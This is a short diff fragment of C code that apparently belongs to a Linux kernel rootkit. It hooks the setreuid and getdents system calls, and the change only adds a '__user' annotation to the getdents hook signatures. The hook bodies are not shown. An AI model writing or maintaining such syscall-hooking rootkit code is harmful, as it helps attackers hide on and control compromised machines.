@@ -25,8 +25,8 @@ asmlinkage int new_setreuid(uid_t ruid, uid_t euid)
     return orig_setreuid(ruid, euid);
 }
 
-asmlinkage int (*orig_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
-asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
+asmlinkage int (*orig_getdents)(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);
+asmlinkage int new_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
 {
     int ret, i, j;
     char *buf, *userp;
